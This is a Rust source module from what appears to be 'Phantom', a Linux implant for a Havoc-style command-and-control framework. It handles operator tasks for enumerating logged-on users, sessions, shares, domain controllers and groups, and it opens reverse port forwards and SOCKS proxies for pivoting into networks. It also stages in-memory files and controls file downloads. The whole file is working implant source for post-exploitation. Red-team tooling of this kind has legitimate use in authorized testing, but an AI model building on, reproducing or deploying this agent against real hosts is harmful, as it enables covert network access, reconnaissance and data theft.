//! Network, socket, memfile, and transfer commands.

use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};

use red_cell_common::demon::{
    DemonCommand, DemonNetCommand, DemonSocketCommand, DemonSocketType, DemonTransferCommand,
};
use tokio::net::TcpStream as TokioTcpStream;

use crate::error::PhantomError;
use crate::parser::TaskParser;

use super::encode::*;
use super::sysinfo::{
    compatible_computer_list, compatible_dc_list, compatible_share_list, default_net_target,
    enumerate_groups, enumerate_users, linux_domain_name, logged_on_sessions, logged_on_users,
};
use super::types::{
    DownloadTransferState, ManagedSocket, MemFile, PendingCallback, ReversePortForward,
    ReversePortForwardMode, SocksConnectRequest, SocksProxy, SocksRequestError,
    SOCKS_COMMAND_CONNECT, SOCKS_METHOD_NOT_ACCEPTABLE, SOCKS_METHOD_NO_AUTH, SOCKS_VERSION,
};
use super::PhantomState;

/// Handle `CommandNet`: domain, logons, sessions, computers, shares, groups, users.
pub(super) fn execute_network(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative network subcommand"))?;
    let subcommand = DemonNetCommand::try_from(subcommand)?;

    match subcommand {
        DemonNetCommand::Domain => state.queue_callback(PendingCallback::Structured {
            command_id: u32::from(DemonCommand::CommandNet),
            request_id,
            payload: encode_net_domain(&linux_domain_name())?,
        }),
        DemonNetCommand::Logons => {
            let target = default_net_target(&parser.wstring()?);
            let users = logged_on_users();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_logons(&target, &users)?,
            });
        }
        DemonNetCommand::Sessions => {
            let target = default_net_target(&parser.wstring()?);
            let sessions = logged_on_sessions();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_sessions(&target, &sessions)?,
            });
        }
        DemonNetCommand::Computer => {
            let target = default_net_target(&parser.wstring()?);
            let computers = compatible_computer_list(&target);
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_name_list(DemonNetCommand::Computer, &target, &computers)?,
            });
        }
        DemonNetCommand::DcList => {
            let target = default_net_target(&parser.wstring()?);
            let controllers = compatible_dc_list(&target);
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_name_list(DemonNetCommand::DcList, &target, &controllers)?,
            });
        }
        DemonNetCommand::Share => {
            let target = default_net_target(&parser.wstring()?);
            let shares = compatible_share_list();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_shares(&target, &shares)?,
            });
        }
        DemonNetCommand::LocalGroup => {
            let target = default_net_target(&parser.wstring()?);
            let groups = enumerate_groups()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_groups(DemonNetCommand::LocalGroup, &target, &groups)?,
            });
        }
        DemonNetCommand::Group => {
            let target = default_net_target(&parser.wstring()?);
            let groups = enumerate_groups()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_groups(DemonNetCommand::Group, &target, &groups)?,
            });
        }
        DemonNetCommand::Users => {
            let target = default_net_target(&parser.wstring()?);
            let users = enumerate_users()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_users(&target, &users)?,
            });
        }
    }

    Ok(())
}

/// Handle `CommandSocket`: reverse port forwards, SOCKS proxies, socket I/O.
pub(super) async fn execute_socket(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative socket subcommand"))?;
    let subcommand = DemonSocketCommand::try_from(subcommand)?;

    match subcommand {
        DemonSocketCommand::ReversePortForwardAdd => {
            let (bind_addr, bind_port, forward_addr, forward_port) =
                parse_reverse_port_forward_target(&mut parser)?;
            handle_reverse_port_forward_add(
                request_id,
                state,
                ReversePortForwardMode::Teamserver,
                bind_addr,
                bind_port,
                forward_addr,
                forward_port,
                DemonSocketCommand::ReversePortForwardAdd,
            )?;
        }
        DemonSocketCommand::ReversePortForwardAddLocal => {
            let (bind_addr, bind_port, forward_addr, forward_port) =
                parse_reverse_port_forward_target(&mut parser)?;
            handle_reverse_port_forward_add(
                request_id,
                state,
                ReversePortForwardMode::Local,
                bind_addr,
                bind_port,
                forward_addr,
                forward_port,
                DemonSocketCommand::ReversePortForwardAddLocal,
            )?;
        }
        DemonSocketCommand::ReversePortForwardList => {
            let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
            for (socket_id, listener) in &state.reverse_port_forwards {
                payload.extend_from_slice(&encode_u32(*socket_id));
                payload.extend_from_slice(&encode_u32(listener.bind_addr));
                payload.extend_from_slice(&encode_u32(listener.bind_port));
                payload.extend_from_slice(&encode_u32(listener.forward_addr));
                payload.extend_from_slice(&encode_u32(listener.forward_port));
            }
            state.queue_callback(PendingCallback::Socket { request_id, payload });
        }
        DemonSocketCommand::ReversePortForwardClear => {
            let listener_ids = state.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
            for listener_id in listener_ids {
                state.remove_reverse_port_forward(listener_id);
            }
            let client_ids = state
                .sockets
                .iter()
                .filter_map(|(socket_id, socket)| {
                    (socket.socket_type == DemonSocketType::Client).then_some(*socket_id)
                })
                .collect::<Vec<_>>();
            for client_id in client_ids {
                state.remove_socket(client_id);
            }
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_socket_clear(true),
            });
        }
        DemonSocketCommand::ReversePortForwardRemove => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward socket id"))?;
            if state.reverse_port_forwards.contains_key(&socket_id) {
                let callbacks_before = state.pending_callbacks.len();
                state.remove_reverse_port_forward(socket_id);
                if let Some(PendingCallback::Socket { request_id: callback_request_id, .. }) =
                    state.pending_callbacks.get_mut(callbacks_before)
                {
                    *callback_request_id = request_id;
                }
            }
        }
        DemonSocketCommand::SocksProxyAdd => {
            let bind_addr = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind address"))?;
            let bind_port = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind port"))?;
            let listener_id = state.allocate_socket_id();
            let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
            match TcpListener::bind(bind_socket) {
                Ok(listener) => {
                    listener
                        .set_nonblocking(true)
                        .map_err(|error| PhantomError::Socket(error.to_string()))?;
                    let bound_port = listener
                        .local_addr()
                        .map(|addr| u32::from(addr.port()))
                        .unwrap_or(bind_port);
                    state.socks_proxies.insert(
                        listener_id,
                        SocksProxy { listener, bind_addr, bind_port: bound_port },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socks_proxy_add(true, listener_id, bind_addr, bound_port),
                    });
                }
                Err(_error) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                    });
                }
            }
        }
        DemonSocketCommand::SocksProxyList => {
            let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyList));
            for (socket_id, proxy) in &state.socks_proxies {
                payload.extend_from_slice(&encode_u32(*socket_id));
                payload.extend_from_slice(&encode_u32(proxy.bind_addr));
                payload.extend_from_slice(&encode_u32(proxy.bind_port));
            }
            state.queue_callback(PendingCallback::Socket { request_id, payload });
        }
        DemonSocketCommand::SocksProxyRemove => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy socket id"))?;
            if state.socks_proxies.remove(&socket_id).is_some() {
                let client_ids = state
                    .socks_clients
                    .iter()
                    .filter_map(|(client_id, client)| {
                        (client.server_id == socket_id).then_some(*client_id)
                    })
                    .collect::<Vec<_>>();
                for client_id in client_ids {
                    state.socks_clients.remove(&client_id);
                }
                state.queue_callback(PendingCallback::Socket {
                    request_id,
                    payload: encode_socks_proxy_remove(socket_id),
                });
            }
        }
        DemonSocketCommand::SocksProxyClear => {
            state.socks_proxies.clear();
            state.socks_clients.clear();
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_socks_proxy_clear(true),
            });
        }
        DemonSocketCommand::Open => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: String::from("socket open is a callback-only path in Phantom"),
            });
        }
        DemonSocketCommand::Read => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let socket_type = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket type"))?;
            let socket_type = DemonSocketType::try_from(socket_type)?;
            let success = parser.bool32()?;

            if success {
                let data = parser.bytes()?;
                write_to_socket(request_id, state, socket_id, socket_type, data)?;
            } else {
                let error_code = u32::try_from(parser.int32()?)
                    .map_err(|_| PhantomError::TaskParse("negative socket error code"))?;
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("socket {socket_id:#x} read failed with error {error_code}"),
                });
            }
        }
        DemonSocketCommand::Write => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let data = parser.bytes()?;
            let mut write_failure = None;
            if let Some(socket) = state.sockets.get_mut(&socket_id) {
                if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
                    write_failure = Some(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_write_failure(
                            socket_id,
                            socket.socket_type,
                            raw_socket_error(&error),
                        ),
                    });
                }
            }
            if let Some(callback) = write_failure {
                state.queue_callback(callback);
                state.remove_socket(socket_id);
            }
        }
        DemonSocketCommand::Close => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            state.remove_socket(socket_id);
        }
        DemonSocketCommand::Connect => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let atyp = parser.byte()?;
            let host = parser.bytes()?;
            let port = u16::from_ne_bytes(parser.int16()?.to_ne_bytes());

            let connection = connect_socks_target(atyp, host, port).await;
            match connection {
                Ok(stream) => {
                    state.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::ReverseProxy,
                            bind_addr: 0,
                            bind_port: u32::from(port),
                            forward_addr: 0,
                            forward_port: 0,
                        },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(true, socket_id, 0),
                    });
                }
                Err(error_code) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(false, socket_id, error_code),
                    });
                }
            }
        }
    }

    Ok(())
}

/// Handle `CommandMemFile`: in-memory file chunks.
pub(super) fn execute_memfile(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let mem_file_id = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
    let total_size = usize::try_from(parser.int64()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile size"))?;
    let chunk = parser.bytes()?;

    let entry = state.mem_files.entry(mem_file_id).or_insert_with(|| MemFile {
        expected_size: total_size,
        data: Vec::with_capacity(total_size),
    });

    if entry.expected_size != total_size || entry.data.len() > total_size {
        state.queue_callback(PendingCallback::MemFileAck {
            request_id,
            mem_file_id,
            success: false,
        });
        return Ok(());
    }

    entry.append(chunk);
    state.queue_callback(PendingCallback::MemFileAck { request_id, mem_file_id, success: true });

    Ok(())
}

/// Handle `CommandTransfer` (2530): list, stop, resume, remove active downloads.
pub(super) fn execute_transfer(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative transfer subcommand"))?;
    let subcommand = DemonTransferCommand::try_from(subcommand)?;

    match subcommand {
        DemonTransferCommand::List => {
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_list(&state.downloads),
            });
        }
        DemonTransferCommand::Stop => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Stopped;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Stop, found, file_id),
            });
        }
        DemonTransferCommand::Resume => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Running;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Resume, found, file_id),
            });
        }
        DemonTransferCommand::Remove => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Remove;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Remove, found, file_id),
            });
            // Send a close callback for the removed download, matching Demon behaviour.
            if found {
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandTransfer),
                    request_id,
                    payload: encode_transfer_remove_close(file_id),
                });
            }
        }
    }

    Ok(())
}

fn write_to_socket(
    request_id: u32,
    state: &mut PhantomState,
    socket_id: u32,
    expected_type: DemonSocketType,
    data: &[u8],
) -> Result<(), PhantomError> {
    let Some(socket) = state.sockets.get_mut(&socket_id) else {
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!("socket {socket_id:#x} was not found"),
        });
        return Ok(());
    };

    let socket_type = socket.socket_type;
    if socket_type != expected_type {
        let actual_type = socket_type;
        let _ = socket;
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!(
                "socket {socket_id:#x} has type {:?}, expected {:?}",
                actual_type, expected_type
            ),
        });
        return Ok(());
    }

    if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
        let _ = socket;
        state.queue_callback(PendingCallback::Socket {
            request_id,
            payload: encode_socket_write_failure(socket_id, socket_type, raw_socket_error(&error)),
        });
        state.remove_socket(socket_id);
    }

    Ok(())
}

fn parse_reverse_port_forward_target(
    parser: &mut TaskParser<'_>,
) -> Result<(u32, u32, u32, u32), PhantomError> {
    let bind_addr = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind address"))?;
    let bind_port = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind port"))?;
    let forward_addr = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward address"))?;
    let forward_port = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward port"))?;
    Ok((bind_addr, bind_port, forward_addr, forward_port))
}

fn handle_reverse_port_forward_add(
    request_id: u32,
    state: &mut PhantomState,
    mode: ReversePortForwardMode,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
    command: DemonSocketCommand,
) -> Result<(), PhantomError> {
    let listener_id = state.allocate_socket_id();
    let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
    match TcpListener::bind(bind_socket) {
        Ok(listener) => {
            listener
                .set_nonblocking(true)
                .map_err(|error| PhantomError::Socket(error.to_string()))?;
            let bound_port =
                listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
            state.reverse_port_forwards.insert(
                listener_id,
                ReversePortForward {
                    listener,
                    mode,
                    bind_addr,
                    bind_port: bound_port,
                    forward_addr,
                    forward_port,
                },
            );
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_port_forward_add(
                    command,
                    true,
                    listener_id,
                    bind_addr,
                    bound_port,
                    forward_addr,
                    forward_port,
                ),
            });
        }
        Err(_error) => {
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_port_forward_add(
                    command,
                    false,
                    0,
                    bind_addr,
                    bind_port,
                    forward_addr,
                    forward_port,
                ),
            });
        }
    }
    Ok(())
}

pub(crate) async fn connect_socks_target(
    atyp: u8,
    host: &[u8],
    port: u16,
) -> Result<TcpStream, u32> {
    let target = match atyp {
        1 if host.len() == 4 => format!("{}.{}.{}.{}:{port}", host[0], host[1], host[2], host[3]),
        3 => {
            let hostname = String::from_utf8(host.to_vec()).map_err(|_| 1_u32)?;
            format!("{hostname}:{port}")
        }
        4 if host.len() == 16 => {
            let segments = host
                .chunks_exact(2)
                .map(|chunk| u16::from_be_bytes([chunk[0], chunk[1]]))
                .collect::<Vec<_>>();
            format!(
                "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{port}",
                segments[0],
                segments[1],
                segments[2],
                segments[3],
                segments[4],
                segments[5],
                segments[6],
                segments[7],
            )
        }
        _ => return Err(1),
    };

    let stream =
        TokioTcpStream::connect(&target).await.map_err(|error| raw_socket_error(&error))?;
    let stream = stream.into_std().map_err(|error| raw_socket_error(&error))?;
    stream.set_nonblocking(true).map_err(|error| raw_socket_error(&error))?;
    Ok(stream)
}

pub(crate) async fn connect_ipv4_target(addr: u32, port: u16) -> Result<TcpStream, u32> {
    let octets = Ipv4Addr::from(addr).octets();
    connect_socks_target(1, &octets, port).await
}

pub(crate) fn read_available(
    stream: &mut TcpStream,
    buffer: &mut Vec<u8>,
) -> Result<bool, PhantomError> {
    let mut chunk = [0_u8; 4096];
    loop {
        match stream.read(&mut chunk) {
            Ok(0) => return Ok(true),
            Ok(read) => buffer.extend_from_slice(&chunk[..read]),
            Err(error) if error.kind() == ErrorKind::WouldBlock => return Ok(false),
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(error) => return Err(PhantomError::Socket(error.to_string())),
        }
    }
}

pub(crate) fn pump_stream(source: &mut TcpStream, sink: &mut TcpStream) -> bool {
    let mut buffer = [0_u8; 4096];
    loop {
        match source.read(&mut buffer) {
            Ok(0) => return true,
            Ok(read) => {
                if write_all_nonblocking(sink, &buffer[..read]).is_err() {
                    return true;
                }
            }
            Err(error) if error.kind() == ErrorKind::WouldBlock => return false,
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(_) => return true,
        }
    }
}

pub(crate) fn try_parse_socks_greeting(buffer: &[u8]) -> Option<Result<usize, u8>> {
    if buffer.len() < 2 {
        return None;
    }
    if buffer[0] != SOCKS_VERSION {
        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
    }
    let total = 2 + usize::from(buffer[1]);
    if buffer.len() < total {
        return None;
    }
    if !buffer[2..total].contains(&SOCKS_METHOD_NO_AUTH) {
        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
    }
    Some(Ok(total))
}

pub(crate) fn try_parse_socks_request(
    buffer: &[u8],
) -> Option<Result<(usize, SocksConnectRequest), SocksRequestError>> {
    if buffer.len() < 4 {
        return None;
    }
    if buffer[0] != SOCKS_VERSION {
        return Some(Err(SocksRequestError::GeneralFailure));
    }
    if buffer[1] != SOCKS_COMMAND_CONNECT {
        return Some(Err(SocksRequestError::CommandNotSupported));
    }

    let atyp = buffer[3];
    let address_len = match atyp {
        1 => 4,
        3 => {
            if buffer.len() < 5 {
                return None;
            }
            usize::from(buffer[4]) + 1
        }
        4 => 16,
        _ => return Some(Err(SocksRequestError::AddressTypeNotSupported)),
    };

    let header_len = 4 + address_len;
    if buffer.len() < header_len + 2 {
        return None;
    }

    let address = match atyp {
        3 => buffer[5..header_len].to_vec(),
        _ => buffer[4..header_len].to_vec(),
    };
    let port = u16::from_be_bytes([buffer[header_len], buffer[header_len + 1]]);
    Some(Ok((header_len + 2, SocksConnectRequest { atyp, address, port })))
}

pub(crate) fn send_socks_reply(
    stream: &mut TcpStream,
    reply: u8,
    atyp: u8,
    address: &[u8],
    port: u16,
) -> Result<(), PhantomError> {
    let mut response = vec![SOCKS_VERSION, reply, 0, atyp];
    match atyp {
        3 => {
            let length = u8::try_from(address.len())
                .map_err(|_| PhantomError::Socket(String::from("SOCKS domain too long")))?;
            response.push(length);
            response.extend_from_slice(address);
        }
        _ => response.extend_from_slice(address),
    }
    response.extend_from_slice(&port.to_be_bytes());
    write_all_nonblocking(stream, &response)
        .map_err(|error| PhantomError::Socket(error.to_string()))
}

pub(crate) fn write_all_nonblocking(
    stream: &mut TcpStream,
    mut data: &[u8],
) -> std::io::Result<()> {
    while !data.is_empty() {
        match stream.write(data) {
            Ok(0) => return Err(std::io::Error::new(ErrorKind::WriteZero, "socket closed")),
            Ok(written) => data = &data[written..],
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(error) => return Err(error),
        }
    }

    Ok(())
}

pub(crate) fn raw_socket_error(error: &std::io::Error) -> u32 {
    error.raw_os_error().and_then(|code| u32::try_from(code).ok()).unwrap_or(1)
}
